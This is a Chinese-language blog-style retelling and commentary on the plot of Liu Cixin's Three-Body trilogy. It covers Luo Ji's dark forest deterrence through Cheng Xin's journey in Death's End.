<p>​        再来看看地球这边，正所谓物极必反，乐极生悲。之前还手舞足蹈欢呼庆祝的人们，当亲眼看见战舰像鞭炮一样炸没时，瞬间全部崩溃，地球人开始陷入绝望，自杀的人络绎不绝。绝大多数人通过肆无忌惮的纵欲来麻痹自己。绝望充斥着这个世界。水滴飞向了太阳，并不断对太阳发出强烈的干扰信号，从此人类再也无法通过太阳作为放大天线，向宇宙发出任何信号。</p>
<p>​        罗辑这边，当他和史强从外面回到家时，发现成千上万的人在等他，人们都把他奉为救世主，全部跪在罗辑面前。他们说，主啊，救救我们吧。原来罗辑之前发出的咒语生效了，那颗指定的恒星被一颗光粒穿过，爆炸了。</p>
<p>​        现在所有人都相信罗辑是某种神，罗辑被恢复了面壁者身份，成为了地球上唯一的面壁者，同时也成为了人类唯一的信仰。现在无论他说什么，人们都会照办。罗辑立刻提了两条要求，第一、所有城市恢复秩序；第二、所有人都回家吧，让我静静。人群散尽后，逻辑给惊讶不已的史强解释了为什么咒语会生效，他提出了黑暗森林法则。</p>
<p>​        首先，宇宙的总量是恒定的，但宇宙中有无数的外星生命都在以指数增长。所以宇宙是一个生存死局。不是你死，就是我亡。在这种严格竞争下，一方的收益必然意味着另一方的损失，双方不存在合作的可能。也就是说，自己文明的未来，就是建立在他人文明的痛苦之上，只有损人利己才能活下去。其结果就是，一方吃掉另一方，所以每个文明都必须为了生存而战。再弱小的文明都有可能技术爆炸，从人类文明来看，我们从猿猴到现在，从宇宙的尺度，就是一瞬间的事，这就导致文明之间，随着时间推移会不断出现猜疑，大家脑子里都在想，他会不会来干掉我，抢我资源，这种不断形成的猜疑链。停止的方法，只有一方死了才会结束。所以为了避免其他文明技术爆炸，在以后跟自己争夺资源。最安全的方法就是发现一个文明后，能消灭的就直接消灭，打不过的就绕着走。</p>
<p>​        罗辑把宇宙比喻成一走黑暗森林，每个文明都是带枪的猎人，像幽灵一般前行在林间，每个猎人都必须小心，因为只要暴露自己的位置，就会被其他文明干掉，毕竟这是保证自己安全最好的手段。</p>
<p>​        我相信玩过吃鸡的人都明白这种感受，想要活下去就得干掉其他人。</p>
<p>​        罗辑之前的咒语，就像是在森林中的某棵树上做了标记，那么其他的猎手最安全的行为，就是悄悄毁掉那片区域。毕竟对于高级文明来说，攻击是最节省成本的。但现在罗辑再也发不出咒语了，因为水滴封锁了太阳信号。其实早在幸存舰队之间的黑暗战役传回地球后，罗辑就已经确信，黑暗森林法则是没有问题的。罗辑只让史强明白了真相，并让他保密.他现在无计可施，渐渐地，罗辑开始借酒消愁，闭门不出，像个流浪汉一样在街上游荡.后来政府机构强迫罗辑随便干点什么以增加人民的信仰，给了罗辑雪地项目。</p>
<p>​        这个项目是通过恒星氢弹，和海王星的油膜物质制造太空尘埃，以便在其余九个水滴到达地球前，可以提前观测到。这个计划显然是没事找事，毕竟观测的唯一作用便是，知道其余水滴什么时候到地球，罗辑无奈之下开始负责这个项目。随着工作的进展，逻辑把全部身心都投入到了雪地工程，把这当成一种逃避手段.但他越投入，人们就越失望。大家逐渐看清，罗辑的行为是在逃避，这是一个希望和失望来的一样快的时代。公众对罗辑失去了信心。很多人都开始怀疑罗辑的咒语，不过是一次巧合。罗辑从人们心中的神，变成了普通人，又变成了大骗子。他面壁者的实际权力也没有了。雪地工程也不得不停止。</p>
<p>​        在一个秋雨连绵的下午，罗辑被逐出自己生活多年的小区。他穿着很脏的外套，拿着铁锹，走到了最初和叶文洁对话的那片墓地。他在叶文洁墓旁开始给自己掘墓，最后精疲力尽的他，趟进坑中回想起自己的一生，他知道，是时候了。他虚弱的拿起手枪，对着空气高喊。我，要和三体人对话。随后露出了手腕上的手表，这是一个检测我生命体征的摇篮系统，只要我死了，学弟工程上的三千六百一十四颗氢弹就会爆炸，由此形成无比巨大的油膜，将会通过太阳反射出三张无比简单的突然，这三张图就是三体星球的坐标。宇宙中其他的文明将会知道你们的存在。他说，30秒后我将对自己的心脏开枪，虽然我知道三体星球暴露后，地球也会随之暴露，但我，只能这样做。</p>
<p>​        短短几秒，一直无处不在的智子在罗辑面前展开成三个球，上面写着，住手。三体人通过智子又说，你把枪放下，咱们好好谈。随后罗辑提出的几个条件三体人都照办了。第一、水滴飞离太阳系；第二、三体飞船离开来太阳系的轨道。</p>
<p>​        罗辑胜利了，他完成了面壁者的使命，他虚弱得差点晕过去，智子不断地关心罗辑的身体状况，生怕摇篮系统终止。摇篮系统是非常严谨的，如果水滴试图去触碰雪地工程上的氢弹，也会引发爆炸。他很幸运，如果不是三体人因为猜疑，消灭了人类叛军，罗辑早就死了。</p>
<p>​        五年后。罗辑和他的妻女来到了三体人帮地球人建造的引力波天线附近玩耍，这种天线不需要通过太阳，直接就可以像宇宙发射信号，正在玩耍的一家人，突然看见智子在他们面前展开，与他对话的是当年警告人类不要回复的监听员1379。他与逻辑相互表达敬意。临近晚霞，1379说，太阳快落下去了，你们的孩子居然不害怕。罗辑回答道，当然不害怕，她知道，明天的太阳还会升起来。</p>
<p>​        从叶文洁开头和罗辑的对话可以看出，这个把人类坑死的女人，在那时貌似开始有了一丝愧疚。社会中一时兴起的逃亡主义，由于只有少部分人可以逃走，所以被大部分人禁止了。在此时，人人向往的公平，反而成为了人类生存的障碍。在智子的监视下，人类变得毫无隐私，人们为了欺骗三体人，制定了面壁者计划，选出四位大骗子作为面壁者去骗三体人，其中三位面壁者都是世界知名人物，看似志在必得，信心满满，但都被一一击败，而罗辑却成为了真正的救世主。人类从绝望的大低谷时代觉醒，进入了信心满满的新时代，却又在末日之战中再次陷入了绝望，这里好像是在说，人总是好了伤疤忘了疼。从幸存的那几艘飞船之间的战斗，再到宇宙的黑暗森林法则可以看出，竞争是残酷的。宇宙是一个生死局，不是你死就是我活。从逃亡主义，到泰勒和雷迪亚兹要以杀死自己人为代价，去威慑三体人；再到罗辑怕公众知道黑暗森林法则后大家反对自己的计划所以不敢公布，这些或许想告诉我们，大多数人都是自私的，整个故事无论是叶文洁的悔悟，还是罗辑的成长，又或是人类从痛苦的反省，这些都仿佛在告诉我们，痛苦是成长的催化剂。</p>
<h3 id="死神永生-上"><a href="#死神永生-上" class="headerlink" title="死神永生 上"></a>死神永生 上</h3><p>​        这个故事要从一个叫云天明的人开始说起。在以前的危机纪元4年，那个时候的人们心情很复杂，外星人400年后会来侵略地球这个消息，在那会可是一个既新鲜又可怕又劲爆的消息，各个媒体都在铺天盖地的报道这件事情。不过在云天明眼里，什么三体人四百年后会侵略地球，那都不是事儿，因为以他的病情，明年的事都不用他操心了。他的身边没有几个亲戚，其中他的姐姐还总想让他早点安乐死，那时候，治疗绝症就是个花钱的无底洞，对于拖家带口还没买房子的姐姐来说，弟弟云天明早点死她还能从父亲那拿到不少遗产。云天明也很识趣，也不想受罪。想着，就这两天准备安乐死吧。</p>
<p>​        就在他想着安乐死的这件事儿的时候，云天明的同学胡文，带着创业成功的喜悦找到了云天明。胡文的公司主要是卖饮料的，胡文能来找云天明并不是他们之间关系有多好，而是胡文卖饮料能成功，是因为，云天明的一个点子。这个点子来自于云天明对饮料独特的爱好，这个爱好就是，在矿泉水里塞野草喝。胡文当场给了云天明三百万，这笔钱对云天明来说可有可无，云天明本想拒绝，但胡文非常坚持，无奈之下云天明才收下了这笔巨款。没多久，云天明还是决定安乐死，他的病已经重到五福享受这300万了。这笔巨款他并不打算留给姐姐，毕竟云天明已经如姐姐所愿，赶紧去阎王爷那报道了。此时，他突然灵光一闪，云天明决定用这笔钱，给他大学里暗恋的程心送一颗星星，一颗真正的星星。</p>
<p>​        那去哪买一颗星星呢？这是联合股展开了一项群星计划，主要的目的，是骗钱。。。对外叫筹款。他们拍卖太阳系外的部分恒星所有权，买到了，则会得到一张纸，上面标明你的合法所有权。晚上的时候你就可以望着这颗星星，心理暗爽，哈哈，这颗星星是我的了。然后就没什么乱用了。如果你想去那里，不好意思，不可能。最近的恒星都有一百多光年的距离，所以这个计划，开始时就结束了，总共也没卖出去多少颗。不过有没有用对于云天明现在来说已经不重要了，他从胡文那要到了程心得个人资料，花了三百万，匿名买了一颗恒星送给程心。不禁感叹，云天明真是个浪漫的人啊。第二天，云天明开始接受安乐死。正当他要摁下最后的确认按钮时，程心带着人突然出现。程心对他说出的第一句话非常出乎意料，天明，你知道么，安乐死法是为你通过的。 </p>
<p>​        这话就要从阶梯计划说起来，当时程心在情报局工作，局长叫维德，是一位雷厉风行的关键人物，他有一句广为人知的口号：前进，前进，不择手段的前进。维德想发射一枚速度达到百分之一光速的探测器，去获得三体舰队的情报，在这时，造一枚百分之一光速的探测器是不大现实的。但程心提出了一个设想，造出一枚只有辐射帆的小型探测器，并在辐射帆的航行轨道布置核弹，每一次核弹爆炸都会使飞船加速，这个过程，很像在攀登阶梯，该计划，被命名为阶梯计划。这个计划的负责人，正式程心，这枚探测器必须非常的轻，由于技术的限制，导致探测器小到只能放入一个被急冻的人脑，阶梯计划真是没有办法的办法，大家只能选择相信三体人有能力把一颗人脑还原成一个人，并且他们愿意去这么做。这种行为无异于赌博，且失败率很高，但只要成功，只要有一个人能进入三体舰队的内部，就会引起无限的可能性。程心在执行这一计划时，得知有人匿名送给了自己一颗星星，这对他来说是一个巨大的惊喜。此刻的她陷入了从未有过的幸福感。</p>
<p>​        阶梯计划正在紧锣密鼓的进行着。但用谁的大脑成了问题，在社会道德的压力下，这个人只能从身患绝症并且愿意安乐死的人中选，而且这个人的资历要够也愿意这么做。程心在一次和同学的聊天中，得知以前的同学云天明，身患绝症早已时日无多，程心没有多想，便把它纳入了人选之中，随后便有了程心阻止云天明安乐死的那一幕。</p>
<p>​        云天明得知了这来龙去脉后，接受了女神的请求，加入了阶梯计划。当云天明的大脑被取出后，程心才得知那颗星星正式云天明送的，此时她突然意识到自己做了什么。因为等待云天明的可能是无尽噩梦。假如三体人真的捕获了云天明的大脑。反复虐待也不是没有可能。阶梯计划开始了， 但百密终有一疏，探测器偏离了航线，飞向了无尽的深空。情报局的领导们选中程心冬眠，到未来继续跟进阶梯计划。希望能有奇迹发生。</p>
<p>​        罗辑利用黑暗森林法则拯救了地球后，人们从此进入了威慑纪元。三体人在这个年代，看似跟人类是你好我好大家好。人们感觉，三体人解除了对地球的科技封锁，并细致入微不厌其烦的传授科学。有时自己还被三体人嫌弃学得慢，被催着快点学。人们觉得，自己一下子获得了被压抑几个世纪的知识。</p>
<p>​        三体人还帮助人类建造了引力波天线，和引力波飞船，万有引力号。来帮助人类利用这些工具威慑自己。人们需要建造引力波发射装置，是因为用引力波向宇宙发射信息，比人类之前用的任何手段都靠谱有效。当初人类舰队被水滴团灭，在战场上，只有量子号和青铜时代号，这两艘战舰成功逃离，由于资源有限，青铜时代号突袭了量子号。带着量子号的物资飞往了另一边，经过漫长的一段时间，青铜时代号返航了，现在飞船上的人可以用肉眼看到地球了。他们激动地喊着，回家了，回家了！他们幻想着回到地球上安逸的生活，和被人崇拜的感觉。</p>
<p>​        之前，他们收到了一条消息，被告知，人类对三体世界的威慑，已经成功建立，让他们尽快返航。一开始没人信，后来智子在青铜时代号上展开，并建立了通信，这时青铜时代号上的人才信了。并且他们得知，自己已经成为了人们的英雄，全世界的人们都在盼望着他们回归，青铜时代号的人回到太空港后，战舰上的人，看到人山人海，都在为他们忘情的欢呼着。当青铜时代号上所有人都离舰后，突然一片寂静，迎接他们的人当中有一位上校，开口说了一番话，大致内容如下：你们已被开除了军籍，你们带来的耻辱，永远无法被抹灭，你们的亲人不想见到你们呢，他们以你们为耻，他们恨你们，你们将被移交到司法系统。</p>
<p>​        说完后，大批武装部队出现，逮捕了他们。罪名是一级谋杀和反人类罪。在审判中大家才知道，在当时没有退路的太空里，青铜时代号的人们建立了集权社会，为了集体生存，几乎每个人都放弃了自我，成为了集体的一部分。青铜时代号准备对另一艘战舰发起进攻时，曾有一次投票，舰上94%赞成攻击。当用次声波氢弹解决了量子号后，人们把上面的尸体全部补充进了食品库存，成了船员的食物。</p>
<p>​        最后审判的结果是，138人无罪，6名高级军官终身监禁，其余的人均被判刑。刑期从二十年至三百年不等。在他们进监狱前，有几位青铜时代号上的军官，被宪兵押送着最后一次进入了他们的战舰，进行一些交接工作。其中有一位被押送的军官，史耐德，他在交接完成时，突然进入另一件操作室，快速调出一个通信界面，他说道，青铜时代呼叫蓝色空间！青铜时代呼叫蓝色空间！就在此刻，一束激光穿过他们的胸膛，他用尽最后的生命喊出一句话：不要返航！这里不是家！</p>
<p>​        本来蓝色空间好还在犹豫中，当收到这个警报时，它立刻全功率加速，能飞多远飞多远。不久后万有引力号飞船开始追击逃跑的蓝色空间号，为什么要追呢？因为当人类得知黑暗森立法则后，特别害怕被其他外星文明发现，所以，追击蓝色空间号并将其摧毁，成为了万有引力号当前的首要任务。三体人派出了两个水滴去协助万有引力号。</p>
<p>​        人类文明从三体人那学到了越来越多的东西，而三体人也从人类璀璨的文化中学到了不少。当人们知道，三体人喜欢地球文化时，一开始是不相信的，后来三体人给人们看了很多，自己模仿人类文化的艺术作品，包括电影、小说、绘画等，这些作品，都是用人类作为角色，环境也都是地区上的。这时人们才相信。人们用AI和仿生技术，帮智子造了一个身体，智子成为了有躯体的机器人，摇身一变成为了一位魅力庄重的日本女人。</p>
<p>​        威慑纪元六十一年，程心从冬眠中被唤醒，但并不是因为阶梯计划，而是因为云天明从给他的星星。这颗恒星被发现周围还有两个行星，其中一个与地球十分相似。发现这些的是一名叫艾AA的女博士，一位像鸟儿一样轻灵的女孩子。他后来成为了程心得好友和得力助手。</p>
<p>​        由于现在人们已经具备了星际远航的能力，所以这个消息一出，这颗恒星的价格马上开始飞升。联合国唤醒程心就是为了买下这颗星星。程心因为这个星星开始小有名气。刚来到新世界的程心，自然是很不适应，就像是刘姥姥进大观园一样，看啥都新鲜。在这个和平盛世的年代，男性们都趋于女性化，到处都是精致的女装大佬，程心一开始走在大街上，还以为男人都灭绝了。她不禁感叹，这个时代太温柔了。</p>
<p>​        一天，诚信接到AA的邀请，去一个地方。程心到了后并没有找到AA，等待她的是之前自己的上司，维德冷静的向程心连开两枪，维德告诉他，我与你并没有私人恩怨，只是我需要成为执剑人，而你会阻止我。我必须不择手段的前进。</p>
<p>​        但AA和警察及时赶到，击断了维德的手臂，救了差点死掉的程心。还好AA及时发现了有人伪造她的声音跟程心通话。不然，诚信死定了。维德说的执剑人是什么，跟程心有用什么关系呢？在亚洲，北美，和欧洲，分布着三个引力波天线。还有一个在太空中的引力波天线，就是万有引力号飞船。执剑人掌握着启动引力波天线，向宇宙发射三体恒星坐标信号的权利。只要三体人不老实，信号就会发出去。不久后，三体世界和人类世界都会遭到黑暗森林打击。此时三体和人类这两个世界的文明都掌握在一个人的手里，这个人，就是逻辑。</p>
<p>​        此时的罗辑是第一任执剑人，在这个温柔的年代，人们惧怕危险的执剑人，渐渐的温柔的人们希望执剑人也是温柔的。于是民心所向，大家选择了程心作为下一任执剑人。这个时代的医疗技术已经很先进了，程心恢复得很快。不久后，程心见到了已是百岁老人的罗辑，此时的她已经白发苍苍，十分稳重而且坚定。从前的那个玩世不恭的花花公子消失了，他的妻子和孩子早已离开了他。罗辑在他人眼里变得越来越像一个恶魔，执剑人的交接仪式开始了，罗辑把控制引力波发射按钮的权杖，交给了程心， 罗辑退休了，他完成了使命。而程心万万没想到，她这个执剑人只当了15分钟，就在交接完后，潜伏在太阳系的六颗水滴，突然发动攻击，程心听着警报声不知所措，内心纠结的程心决定扔掉手中的发射控制器。</p>
<p>​        顷刻间，地球上三个引力波发射天线，全部被水滴撞毁。地球从此丧失了黑暗森林威慑能力。三体人一直隐藏着一项本领没有交给人类，那就是制造光速飞船的技术。三体人现在已经造出了光速飞船，四年后，新的三体舰队即将抵达地球。</p>
<p>​        三体人打破了两个文明间脆弱的平衡，智子给人们一年期限全部移民澳大利亚，如有不从者，格杀勿论。三体人不想灭绝人类，完全是出自于对地球文化的热爱和敬意。</p>
<p>​        但大多数人还沉浸在温柔乡里 ，不肯离去，等待奇迹发生。智子一看，原来你们把我说的话当耳旁风，于是没过多久，水滴开始在大城市里乱撞，高楼大厦逐个崩塌，一天内死了三十多万人。人们无奈之下开始往澳大利亚迁徙。</p>
<p>​        一年后，澳大利亚聚集了四十一亿六千万人，智子和水滴不可能管理这么多人，于是他们开始招募地球治安军，三体人给的待遇非常丰厚，既可获得自由，又可获得权力。一时间十亿人争相报名，最后有五百万人通过。</p>
<p>​        这帮治安军，开始还很收敛，但后来，随着澳大利亚的人越来越多，这帮人渐渐变成了魔鬼。随着移民期限的到来，治安军开始大量屠杀没有移民进澳大利亚的人。很多人组成了抵抗三体人的组织。这帮抵抗军的精神领袖便是罗辑。但他们并打不到三体人，因为三体人还没到。他们只能打打身为治安军的人类。</p>
<p>​        当移民结束后，智子切断了对澳大利亚的供给，包括食物，电力等生活必需品。智子的大意就是告诉澳大利亚的人们，你们现在开始人吃人吧。等人口降到三千万到五千万后，我们再开始供给。程心和AA也移民到了澳大利亚，她没被失望的人们打死，得多亏AA和智子的关照。</p>
<p>​        智子本来想带程心离开澳大利亚但被程心拒绝了，她把这个机会给了AA。程心当然知道，自己可能会在这被人吃掉，但心灰意冷的她，早就不在意了。</p>
<p>​        另一边正在追击蓝色空间号的万有引力号，三体人以为他们已经被跟随的水滴解决掉了。但是，万万没有想到，蓝色空间号进入了一个思维碎块，在这个空间里看三维时间的物体，就像看到了细节丰富的三维展开图。如果我在思维空间里拿走三维空间里一个人的心脏，这个被拿走心脏的人，不会有丝毫外伤，简直就是隔空取物。水滴虽然外表坚不可摧，但内部却很脆弱，人们通过四维空间，破坏了水滴的内部，随后，蓝色空间好通过思维空间进入了万有引力号，并控制了这艘飞船。不久后，蓝色空间号吸收了外有引力号上的两百多位船员。经过集体商议，他们认为三体人应该已经占领了地球，打破了和平协议。最终，大家决定，通过万有引力号，向宇宙发出三体恒星的坐标，进行打击报复。这两艘飞船履行完了对人类最后的责任，便继续向星海深处飘去。</p>
<p>​        万有引力号向宇宙发出三体的恒心坐标后，三体世界的恒星马上就被一颗光粒穿过，被彻底毁灭了。从此人们进入了广播纪元。</p>
<p>​        大移民完成后的第六天，三体恒行星被摧毁了。三体人彻底放弃了占领地球，因为他们知道，由于两个文明间长年累月的通讯，三体文明被打击后，太阳系被毁灭也只是时间问题。智子放弃了移民计划，苦难结束了。人们四处欢呼。</p>
<p>​        广播纪元七年，AA在澳大利亚没留多久，这些年她程心的公司打理的很好，成为了太空建筑业的巨头。那些三体人的人类治安军们开始被清算，无数的治安军被判处死刑或监禁。四年后，人们在地球上观测到了三体母星的毁灭，威胁了人类近三个世纪的三体世界，被彻底摧毁了。智子在广播纪元初消失了，偶尔也会作为三体世界的传声筒出现。为什么人类现在不去干掉智子，别忘了，水滴还在地球上呢。</p>
<p>​        有一天，智子突然请罗辑和程心去她家里喝茶，想和这两个老朋友叙叙旧。人们及其重视这次会谈，希望他们能带回一些有价值的信息，当所有人知道三体世界被毁灭后，智子曾代表全三体人在国际社会发表了一段简短的讲话。话语里没有谴责，没有怨恨，没有评价，只是简单通报了灾难过程。三体文明从此开始了星舰文明。</p>
<p>​        罗辑和程心进入了智子的家里。随后，开始了具有重要历史意义的茶道谈话。这场谈话一开始，程心就急于询问各种问题，智子给出的回答，大概就是，太阳系被摧毁是肯定的，但需要一段时间。可能有一两个世纪。当务之急，就是赶紧跑。随后，智子希望不要再被提问。她说，我请二位，是来喝茶道别的。此时，一直沉默的罗辑开口说，我可以再问一个问题么？智子请罗辑稍等一下，沉思过后对罗辑说道，可以，这是出于我们三体人对罗辑您的尊重，但我只能回答你，是，不是或不知道。然后，我便不会再回答二位任何问题了。罗辑丝毫没有犹豫，问出了最后一个问题。在宇宙中存不存在一种安全声明，可以避免黑暗森林打击。整个屋子寂静了很久，智子终于开口了，她说，有。</p>
<p>​        茶道谈话结束了，所有人都在思考如何发布安全声明。宗教总是在人们消极的时代兴旺，地球逐渐成为一个大教堂，一颗祈祷之星。由于三体人知道如何发布安全声明，三体成为了人们心中的神，智子成为了被祈祷的对象。智子的家门口，每日都有成千上万的人在此祈祷，但智子每次也只是向众人微微鞠躬，然后悄然退去。智子要离开的那一天到了，它会离开这个美丽的躯壳，飞往三体舰队。她最后一次会见了罗辑和程心，这次，三个人没说什么话，因为他们都知道，该说的都说完了。智子打破了寂静，她说，我要走了，请二位多多保重。宇宙很大，生活更大，也许以后还有缘再见。还有，程心，云天明要见你。</p>
<p>​        三体文明比地球文明强大太多了，人类在三体人眼里就是虫子，三体人面对虫子的威胁，表现出来的不是憋屈，不是不情愿，而是非常真诚，但又不停地群钊打破这种平衡的可能，这招用的好厉害。差点就把人类给搞定了。看来不懂计谋的三体人，跟人类打交道的这300多年里，跟着学会了不少阴招。两个文明的平衡，就握在执剑人手里，一个合格的执剑人才能保持这种平衡。可惜，想用爱拯救世界的程心不是这个人，在三体的母星被摧毁后，三体人面对自己的宿敌，表现出了得体、礼貌和成熟，没有丝毫怨恨，也没有谈论是非，仅用平淡的茶会结束了300多年的对决。</p>
<h3 id="死神永生-下"><a href="#死神永生-下" class="headerlink" title="死神永生 下"></a>死神永生 下</h3><p>​        智子对程心说，云天明要见你，这句话从何说起。原来，当初三体人一直关注着阶梯计划，当第一批三体舰队，因为罗辑的威胁被迫离开太阳系后，他们决定，去找装有云天明大脑的探测器作为纪念品。</p>
<p>​        从云天明能见程心来看，云天明在三体飞船那里混得还算不错。三体人严正声明，这只是云天明和程心两个人之间的事，双方不能提及三体文明，会面不得有第三方在场，也不能以任何形式记录，为了保证隔离性，这次会面设立在太空中。程心乘坐飞船飞到指定地点后，智子将简历远程的实时视频通讯。如果三体人发现，谈话中设计不允许提及的内容，那么，程心得飞行器将会爆炸。</p>
<p>​        通讯开始了，程心看到了云天明，他的身体被三体人复原了，云天明看起来很健康，很年轻。云天明告诉程心，他在三体飞船上平时除了种地消遣，就是给三体人的孩子们讲故事。这里顺带一提，由于三体文明文化的匮乏，所以三体人特别喜欢挺云天明讲故事。云天明还在那出了书，成为了三体世界知名的文学家。由于三体人已知监视着这场谈话，云天明在跟程心聊了很多家常话后，便给他讲了三个他在飞船上经常给三体人讲的故事。谈话便结束了。在最后的一分钟，程心对云天明提出了约会邀请，她说，宇宙很大，生活更大，我们还会相见的。如果有机会，就在你送给我的那颗星星上见面吧。云天明在最后一刻回答到，好，在我们的星星。</p>
<p>​        通讯结束。当程心返航后，被立马带进了一个小房间，这个房间是智子盲区。虽然三体人已经明确表示，智子会全部撤离地球，单位了保险起见，为了云天明的安全，需要在这里记录下谈话的内容。程心在返程中，心理不断背着云天明给她将的三个故事，因为她知道，这三个故事就是拯救地球的关键，通过长时间的解读，人们终于发现了隐藏在这三个故事中的秘密。</p>
<p>​        1、光速飞船的法发展方向应使用空间曲率驱动器，这种驱动器是通过影响空间，利用空间的曲率把飞船拉至光速。打个比方，就像在小纸船的船尾，装一块小香皂，船会自动向前。这是因为肥皂改变了水的张力，但船前方水面的张力不变，从而把船拉了过去。2、用一层低光速带包裹住太阳系，这就是全宇宙通用的安全生声明。这个被包裹的区域被称之为黑域，在这个黑域里，没有飞船可以飞出去，黑域是一个完全封闭的空间，在这里，人们可以获得安全，但会失去自由。3。最后一个秘密暂且不表，因为直到最后，有人才发现了它。</p>
<p>​        三体人彻底离开而来太阳系。不久后人们为了避免被光粒打击的灾难，开始了，掩体工程。什么是掩体工程呢？以木星、土星、天王星和海王星四大巨星为掩体，在他们的背阳面建造太空城。为什么人们不造光速飞船准备跑路呢？一方面光速飞船会在太空中留下印记，很容易被高级文明观测到；另一方面，在这个时代人权意识极强，因为只有少部分人能离开，大部分人要留下，所以制造光速飞船成为了严重的违法行为。但程心和AA知道，建造光速飞船才是人类的出路。</p>
<p>​        有一天，维德找到了程心，对她说，造光速飞船是一条正确的路。但你没有力量造出来，把你拥有的一切资源给我，让我来，维德随后的一句话让程心同意了。他冷静的对程心说，不要犯第二次错，思索良久后，程心答应了维德。但她有个条件，她说，当你做的事危害人类的生命时，我可以收回你的权利。维德答应了。程心和AA进入了冬眠，等待成果。接下来，程心得公司全权由维德负责。</p>
<p>​        掩体纪元十一年，沉睡了62年的程心被唤醒，由于多次冬眠，程心现在的实际年龄是33岁，在这个平均寿命150岁的年代里，她还是个少女。在这个纪元，形成了四个太空城群落，分别分布在木星、土星、天王星、海王星的背阳面，地球成为了太阳系联邦中的一个普通城邦。现在地球上，人烟稀少，只有五百万不怕死的人生活在那里，每个人在那生活得像国王一样，大自然重新占领了地球。很多人不愿意留在地球是因为，如果太阳系遭受光粒打击，那么地球上的人将无一幸免。程心被带到了一座叫星环城的太空城，他在这见到了一百多岁的维德。维德一直在研发光速飞船，现在已经小有成果。但就在关键时刻，由于联邦政府的反复阻挠，维德与他们撕破了脸，维德现在被政府军包围。但以维德现在的实力，他可以拼死一搏，斗个鱼死网破。但他对程心有承诺，政府唤醒程心得原因，就是希望她可以权维德放下武器。经过维德六十年的努力，曲率驱动器已经研制的差不多了，是否能够继续，就看程心一句话。程心现在想，如果战斗开始，成千上万人会死于非命，善良的程心对维德说吗，你的诺言还有效吗？维德点了点头，程心说道，好，立刻停止一切。维德近乎恳请的说到，再考虑一下吧，程心坚定的说，不需要考虑。维德无助的说到，失去人性，失去很多；失去兽性，失去一切。程心果断的回答道，我选择人性。</p>
<p>​        现场寂静了，维德让众人放下武器，准备投降。维德心中勇往直前的火焰熄灭了。他微笑的对程心说，小女孩，你看我遵守了诺言。不久后，被捕的维德被处以死刑。程心想到未来，去看太阳系被打击后的世界。便再次进入了冬眠。</p>
<p>​        掩体纪元六十七年。此时一艘太空飞船发现了太阳系。这艘飞船主要的任务，就是藏好自己并清理他们发现的低级文明。其中，有一个被称为歌者的底层工作人员，向领导申请了一片叫二向箔的武器，漫不经心的将它仍忘了太阳系。</p>
<p>​        在太空城内，程心和AA都被唤醒了。黑暗森林打击终于降临了，没有人向掩体逃跑，因为太阳系并没有遭到光粒打击，而是受到了一片小纸条。人们通过引力波找到了这张没有厚度，只有一张信用卡代销的白色纸条。过了一段时间，这张小纸条突然越来越大，所有接触他的物体，都遭到了降维打击。从三维降到二维，成了一张画。在俄二向箔周围的飞船准备逃离，但他们发现，只有光速才能逃离二向箔的引力。以这张纸条变大的速度，八到十天后，整个太阳系都将变成一张没有厚度的画。这就是云天明在故事里，最后隐藏的秘密。降维打击。</p>
<p>​        人类多年来，殚精竭虑的在太阳系布置掩体城市，但人类知道掩体，难道那些拥有更高级明文的外星人就不知道吗？弱小和无知不是生存的障碍，傲慢才是。</p>
<p>​        程心和AA在冥王星上的太空博物馆里，找到了快两百岁的罗辑，三人寒暄了一阵后，开始将一些名画运到了飞船上。他们不希望这一些画同博物馆一同二维化。因为那样，未来到访的外星人可能就解读不了人类曾经的文化瑰宝了。罗辑自己留下了一幅画，这幅画就是蒙娜丽莎，他年轻时曾在这幅画面前，与一人陷入爱河。</p>
<p>​        罗辑催促他们尽快上飞船把画运到外面，他自己决定留在这个博物馆里，和蒙娜丽莎一起看着太阳系被二维化。其实，程心他们乘坐的这艘飞船大有来历，这艘飞船名叫星环号，不仅使用了些跟水滴一样坚固的材料，还装备了完整的生态系统和常规引擎，此外，还拥有曲率驱动引擎可进行光速航行。这艘飞船，是太阳系唯一一艘光速飞船。这是怎么回事呢？</p>
<p>​        罗辑通过远程视频通讯，告诉了一直蒙在鼓里程心和AA。原来，维德死后，残余的力量并没有放弃。曾经面壁者雷迪亚兹在水星上做爆炸试验，把水星炸了个大坑。为了隐蔽，维德的余党就把基地设立在了这里，他们对外表示在研究太阳活动。后来联邦政府介入，并一起悄悄地研究光速飞船。星环上安装的引擎就是第一代试验品。只有少数年迈的元老知道这件事，其中，就包括罗辑。</p>
<p>​        程心想回去接罗辑，但飞船不听程心的。因为罗辑，拥有这艘飞船的最高指挥权。罗辑笑了笑说，我这样岁数的人不适合远航，孩子们不要为我操心了，我什么都没有失去。罗辑命令星环号进入光速航行到太阳系以外。飞船开始启动，船后的空间开始畸变。</p>
<p>​        很多人乘坐着常规推动器的飞船，想逃出太阳系。但那是不可能的。但他们看到星环号后面的空间正在畸变时，这些人发现，这是一艘正在加速的光速飞船。于是，这些近乎疯狂的人，有的要去拦截，有的要去击毁，有的要去劫持。但星环号非常的坚固，这些人想把飞船刮破一点皮儿都难。如果当初程心没有组织维德，耽误了那宝贵的时间，光速飞船是个可以批量生产的。但现在，一切都晚了。程心从逻辑的眼神中读出了一句话，孩子，看看你都干了些什么呀。</p>
<p>​        程心现在明白了，什么掩体，什么安全声明，只有光速飞船才是活路。云天明指出了这条路，而程心却把它堵死了。程心到头来，还是犯了第二次错误。程心开始恨维德，为什么要履行承诺。在通话的最后一刻，罗辑说，我要进画里了，孩子们走好。</p>
<p>​        飞船要进入光速了，程心突然想到自己还有个约会。程心说，去我们的星星。于是，太阳系仅存的两个女人，给忘了云天明送给程心的星星。一段时间后，星环号到了这颗恒星，并在一颗蓝色的行星上降落了。在这颗蓝星上有一个帅气的男人在迎接他们。这个人，名叫关一帆。是万有引力号上的研究员，五年前才在冬眠中被唤醒。他收到了星环号的引力波信号，所以留在这等她们。从这个人的口中，二人得知，到头的万有引力号和蓝色空间号上的人，成功创建了四个世界，并且还在扩张中。这颗蓝星上，没有高等生命，像是原始的地球。他们三人在这待了一段时间。</p>
